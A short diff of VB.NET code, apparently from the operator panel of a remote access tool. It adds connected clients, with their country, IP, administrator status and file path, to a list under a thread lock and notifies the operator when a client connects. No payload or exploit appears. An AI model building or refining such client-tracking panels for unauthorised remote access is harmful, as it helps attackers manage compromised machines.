@@ -26,11 +26,12 @@
                         Next
 
                         ''''
-                        C.L = M.L1.Items.Add(_Gio.LookupCountryName(C.IP.Split(":")(0)), _Gio.LookupCountryCode(C.IP.Split(":")(0)) & ".png")
+                        C.L = New ListViewItem()
+                        C.L.Text = _Gio.LookupCountryName(C.IP.Split(":")(0))
+                        C.L.ImageKey = _Gio.LookupCountryCode(C.IP.Split(":")(0)) & ".png"
                         C.L.Tag = C
                         Try : C.L.ToolTipText = String.Format("Administrator {0}" + Environment.NewLine + "Full Path {1}", A(14), A(15)) : Catch : End Try
                         C.L.SubItems.Add(C.IP.Split(":")(0))
-                        S_Settings.Online.Add(C)
                         For i As Integer = 1 To A.Length - 1
                             If i = 15 Then Exit For
                             C.L.SubItems.Add(A(i))
@@ -47,7 +48,11 @@
                         Catch ex As Exception
                         End Try
 
-                        M.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
+                        SyncLock S_Settings.LVlocker
+                            M.L1.Items.Add(C.L)
+                            M.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
+                            S_Settings.Online.Add(C)
+                        End SyncLock
 
                         If M.MetroToggle1.Checked = True Then
                             M.NotifyIcon1.BalloonTipIcon = ToolTipIcon.None
